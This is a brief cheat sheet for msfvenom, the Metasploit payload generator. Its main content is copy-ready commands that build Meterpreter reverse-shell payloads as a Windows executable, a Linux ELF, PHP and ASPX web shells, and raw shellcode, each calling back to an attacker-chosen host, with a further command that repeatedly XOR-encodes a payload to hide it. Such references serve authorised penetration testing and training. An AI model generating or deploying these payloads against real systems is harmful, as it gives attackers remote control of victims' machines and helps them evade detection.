#tool #cheatsheet #msfvenom #payloads

# Msfvenom Cheat Sheet

Msfvenom is the Metasploit payload generation utility used to create payloads for different operating systems, architectures, and output formats.

---

# Basic Syntax

```bash
msfvenom -p <payload> [OPTIONS]
```

---

# List Payloads

```bash
msfvenom --list payloads
```

Display available payloads.

---

# List Formats

```bash
msfvenom --list formats
```

Display supported output formats.

---

# List Encoders

```bash
msfvenom --list encoders
```

Display available encoders.

---

# Windows Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe
```

Generate a Windows executable.

---

# Linux Payload

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
```

Generate a Linux ELF payload.

---

# PHP Payload

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw
```

Generate a PHP payload.

---

# ASPX Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f aspx -o shell.aspx
```

Generate an ASP.NET payload.

---

# Raw Shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw
```

Generate raw shellcode.

---

# Encoding

```bash
msfvenom -p <payload> -e x64/xor -i 5 -f exe
```

Encode a payload multiple times.

---

# Commands You'll Use Most

```bash
msfvenom --list payloads

msfvenom --list formats

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
```